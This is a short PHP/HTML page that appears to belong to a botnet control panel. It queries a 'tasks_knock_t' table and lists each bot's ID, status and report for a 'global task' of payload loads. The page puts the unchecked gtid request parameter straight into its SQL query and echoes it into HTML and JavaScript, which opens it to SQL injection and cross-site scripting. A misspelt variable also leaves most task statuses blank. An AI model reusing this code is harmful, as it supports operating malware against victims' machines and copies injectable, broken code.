<script type="text/javascript" src="js/scroll.js"></script>

<script type="text/javascript">
function ajaxScrollToRep(fromel) {
	scrollIt(fromel, 'trep');
}
</script>

<script type="text/javascript" src="js/scroll.js"></script>

<script type="text/javascript">
function ajaxScrollToGT(toel) {
	scrollIt('gtlink', toel);
}
</script>

<?php

$gtid = $_GET['gtid'];
if (!@$gtid) exit;

?>

<h3>Loads for <a href="#null" id='gtlink' onclick="ajaxScrollToGT('t' + '<?php echo $gtid; ?>'); return false;"><b>Global task # <?php echo $gtid; ?> </b></a></h3>

<table align='center' width='740px' border='1' cellspacing='0' cellpadding='0' style='border: 1px solid gray; font-size: 9px; border-collapse: collapse; background-color: white;'>
	<th>ID Task</th>
	<th>ID Bot</th>
	<th>Status</th>
	<th>Report</th>

<?php

require_once 'mod_dbase.php';

$dbase = db_open();
if (!$dbase) exit;

$sql = "SELECT *"
	 . "  FROM tasks_knock_t"
	 . " WHERE fk_gtask = $gtid"; 
$res = mysqli_query($dbase, $sql);
 	  
if (@($res)) {
	while ( list($id, $fk_gtask, $botid, $status, $rep) = mysqli_fetch_array($res) ) {
	
		switch ($status) {
			case 0:
				$status = '';
				break;
			case 1:
				$sratus = 'SLOPPY';
				break;
			case 2:
				$sratus = 'OK';
				break;
			case 3:
				$sratus = 'ERROR';
				break;
		}
	
		echo "<tr align='center'>\n";
		echo "<td>$id</td>";
		echo "<td>$botid</td>";
		echo "<td>$status</td>";
		echo "<td>$rep</td>";
		echo "</tr>";
		  
	}
	echo "</table>";
}
else {
	echo "<font class='error'>SQL-Error</font> : <small>$sql</small>";
}

db_close($dbase);

?>
 
<hr size='1' color='#CCC'>

<div id='ajax_stat_b_sub_sub'>
</div>
